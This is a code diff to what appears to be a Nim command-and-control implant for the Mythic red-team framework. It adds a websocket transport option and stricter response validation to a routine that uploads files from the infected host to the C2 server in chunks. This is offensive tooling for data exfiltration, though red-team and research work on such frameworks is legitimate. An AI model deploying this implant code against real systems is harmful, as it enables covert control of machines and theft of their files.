@@ -11,6 +11,8 @@ import std/options
 
 when defined(PROFILE_SMB):
   import profiles/smb as profile
+elif defined(PROFILE_WEBSOCKET):
+  import profiles/websocket as profile
 else:
   import profiles/http as profile
 
@@ -142,9 +144,23 @@ proc uploadFileToMythic*(taskId: string, pathToFile: string, mythicFileId: var s
   let fileUploadResponse = sendAndRetrData(%*resp)
 
   if fileUploadResponse.isSome():
-    let mainResp = fileUploadResponse.get()["responses"][0]
+    let uploadResp = fileUploadResponse.get()
+    if uploadResp.kind != JObject or not uploadResp.hasKey("responses") or uploadResp["responses"].kind != JArray or uploadResp["responses"].len == 0:
+      DBG("[-] Invalid upload initialization response from C2")
+      return false
+
+    let mainResp = uploadResp["responses"][0]
+    if mainResp.kind != JObject or not mainResp.hasKey("status"):
+      DBG("[-] Invalid upload status response from C2")
+      return false
+
     if mainResp["status"].getStr() != "success":
       return false
+
+    if not mainResp.hasKey("file_id"):
+      DBG("[-] Missing file_id in upload initialization response")
+      return false
+
     fileUUID = mainResp["file_id"].getStr
 
   else:
@@ -200,9 +216,21 @@ proc uploadFileToMythic*(taskId: string, pathToFile: string, mythicFileId: var s
     # check if the server accepted the chunk, if not, abort the download
     # procedure
     if fileUploadResponse.isSome():
-      let mainResp = fileUploadResponse.get()["responses"][0]
+      let chunkResp = fileUploadResponse.get()
+      if chunkResp.kind != JObject or not chunkResp.hasKey("responses") or chunkResp["responses"].kind != JArray or chunkResp["responses"].len == 0:
+        DBG("[-] Invalid upload chunk response from C2")
+        return false
+
+      let mainResp = chunkResp["responses"][0]
+      if mainResp.kind != JObject or not mainResp.hasKey("status"):
+        DBG("[-] Invalid upload chunk status response from C2")
+        return false
+
       if mainResp["status"].getStr() != "success":
         return false
+    else:
+      DBG("[-] No response from C2 while uploading chunk " & $i)
+      return false
 
   return true
 
